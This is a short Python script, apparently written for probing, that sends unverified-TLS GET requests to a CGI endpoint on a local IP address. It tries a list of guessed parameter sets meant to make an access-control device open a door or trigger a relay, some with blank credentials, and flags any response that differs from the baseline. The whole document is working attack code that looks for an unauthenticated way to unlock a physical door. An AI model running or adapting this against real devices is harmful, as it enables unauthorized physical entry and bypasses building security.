import ssl
import urllib.parse
import urllib.request

base_url = 'https://192.168.1.235/cgi-bin/monitor.cgi'
ctx = ssl._create_unverified_context()

def fetch(params=None):
    if params:
        qs = urllib.parse.urlencode(params, doseq=True)
        url = base_url + '?' + qs
    else:
        url = base_url
    req = urllib.request.Request(url, method='GET')
    with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
        return resp.status, resp.read().decode('utf-8', errors='replace')

status0, body0 = fetch()
print('baseline', status0, len(body0), body0[:120])

candidates = [
    {'cmd': 'opendoor', 'door': '1', 'time': '5'},
    {'cmd': 'open_door', 'door': '1', 'time': '5'},
    {'cmd': 'remoteopendoor', 'door': '1', 'time': '5'},
    {'cmd': 'control', 'door': '1', 'time': '5'},
    {'operationType': '0', 'relayID': '1', 'time': '5'},
    {'-username': '', '-userpwd': '', 'operationType': '0', 'relayID': '1', 'time': '5'},
    {'-username': '', '-userpwd': '', 'cmd': 'opendoor', 'door': '1', 'time': '5'},
    {'-action': '0', '-relay': '1', '-time': '5'},
]

for params in candidates:
    try:
        st, body = fetch(params)
    except Exception as e:
        print('ERR', params, e)
        continue
    same = body == body0
    keyword = any(k in body for k in ('Success', 'Failure', 'Error', 'Session', 'StopLogin'))
    if (not same) or keyword:
        print('DIFF', params, 'status', st, 'len', len(body), 'keyword', keyword)
        print(' head:', body[:200].replace('\n', ' '))
    else:
        print('same', params)
